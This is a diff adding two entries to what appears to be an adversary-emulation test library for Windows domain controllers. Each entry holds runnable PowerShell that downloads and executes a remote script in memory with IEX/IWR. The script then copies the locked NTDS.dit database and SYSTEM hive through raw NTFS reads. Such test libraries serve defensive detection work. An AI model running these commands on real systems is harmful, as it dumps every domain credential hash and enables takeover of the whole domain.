@@ -274,6 +274,62 @@
         }
       ],
       "auto_generated_guid": "b385996c-0e7d-4e27-95a4-aca046b119a7"
+    },
+    {
+      "name": "Copy NTDS in low level NTFS acquisition via MFT parsing",
+      "description": "This test is intended to be run on a domain Controller.\n\nUnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "remove-item \"#{extract_path}\\ntds.dit\" -force -erroraction silentlycontinue\nremove-item \"#{extract_path}\\SYSTEM_HIVE\" -force -erroraction silentlycontinue",
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR #{script_url} -UseBasicParsing)\nUnderlay-Copy -Mode MFT -SourceFile C:\\Windows\\NTDS\\ntds.dit -DestinationFile #{extract_path}\\ntds.dit\nUnderlay-Copy -Mode MFT -SourceFile C:\\Windows\\System32\\config\\SYSTEM -DestinationFile #{extract_path}\\SYSTEM_HIVE"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "extract_path",
+          "description": "Path for extracted NTDS.dit",
+          "type": "string",
+          "default": "C:\\Windows\\Temp"
+        },
+        {
+          "arg_name": "script_url",
+          "description": "URL to UnderlayCopy script",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1"
+        }
+      ],
+      "auto_generated_guid": "f57cb283-c131-4e2f-8a6c-363d575748b2"
+    },
+    {
+      "name": "Copy NTDS in low level NTFS acquisition via fsutil",
+      "description": "This test is intended to be run on a domain Controller.\n\nUnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "remove-item \"#{extract_path}\\ntds.dit\" -force -erroraction silentlycontinue\nremove-item \"#{extract_path}\\SYSTEM_HIVE\" -force -erroraction silentlycontinue",
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR #{script_url} -UseBasicParsing)\nUnderlay-Copy -Mode Metadata -SourceFile C:\\Windows\\NTDS\\ntds.dit -DestinationFile #{extract_path}\\ntds.dit\nUnderlay-Copy -Mode Metadata -SourceFile C:\\Windows\\System32\\config\\SYSTEM -DestinationFile #{extract_path}\\SYSTEM_HIVE"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "extract_path",
+          "description": "Path for extracted NTDS.dit",
+          "type": "string",
+          "default": "C:\\Windows\\Temp"
+        },
+        {
+          "arg_name": "script_url",
+          "description": "URL to UnderlayCopy script",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1"
+        }
+      ],
+      "auto_generated_guid": "c7be89f7-5d06-4321-9f90-8676a77e0502"
     }
   ]
 }
